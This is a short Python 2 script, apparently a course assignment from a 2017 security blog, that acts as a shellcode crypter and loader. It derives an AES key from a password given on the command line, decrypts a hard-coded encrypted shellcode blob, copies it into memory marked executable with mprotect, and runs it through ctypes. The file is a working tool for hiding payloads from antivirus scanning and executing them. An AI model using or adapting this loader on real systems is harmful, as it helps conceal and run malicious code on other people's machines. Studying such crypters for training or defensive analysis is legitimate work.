#!/usr/bin/python
# Author: Robert Taylor
# http://a41l4.blogspot.ca/2017/03/assignment-7.html
import os
import sys
from Crypto.Cipher import AES
import hashlib
from ctypes import CDLL, c_char_p, c_void_p, memmove, cast, CFUNCTYPE

libc = CDLL('libc.so.6')
my_ciphered=("\xdb\xd8\x9a\xfb\x52\x9f\xa7\x16\xe6\x16\xa0\xe5\x71\x5c\x7b\x14\x1f\x11\x2e\x86\xa2\xa7\x4d\x2a\x6e\x75\x18\x6c\x1b\x1f\x14\x12\x78\x4c\x96\x11\x6c\x6c\xe7\xfd\x9d\xef\xee\x10\x89\x92\xea\x3c")
password=''
BLOCK_SIZE=16
IV=''
my_deciphered = ''

def prnt(stuff):
    """ Print strings to stdout without automatically outputing a
        terminating line feed or space.
    """
    sys.stdout.write(stuff)

def print_array(array):
    """ Print the bytearray """
    for x in bytearray(array):
        prnt('\\x%02x' %x)
    prnt('\n')

def hash_password():
    """ Hash the password. """
    global password
    try:
        password = hashlib.sha256(sys.argv[1]).digest()
        try:
            for i in range(30000):
                password = hashlib.sha256(password + str(i) + sys.argv[1]).digest()
        except:
            print("Something is wrong with your hashing loop")
            sys.exit()
    except:
	print("Please enter your password as the first argument to the script")
        sys.exit()

def decrypt():
    """ Decrypt the shellcode. R.T. """
    global my_deciphered
    IV = my_ciphered[:BLOCK_SIZE]
    obj = AES.new(password, AES.MODE_CBC, IV)
    my_deciphered = obj.decrypt(my_ciphered[BLOCK_SIZE:])

def execute():
    """ Execute the deciphered code """
    code = c_char_p(my_deciphered)
    size = len(my_deciphered)
    addr = c_void_p(libc.valloc(size))
    memmove(addr, code, size)
    libc.mprotect(addr, size, 0x7)
    run = cast(addr, CFUNCTYPE(c_void_p))
    run()

def main():
    hash_password()
    decrypt()
    #print_array(my_deciphered)
    execute()

# Standard boilerplate to call the main() function to begin
# the program. Helps to avoid calling main if this file is imported to another program.
if __name__ == '__main__':
    main()






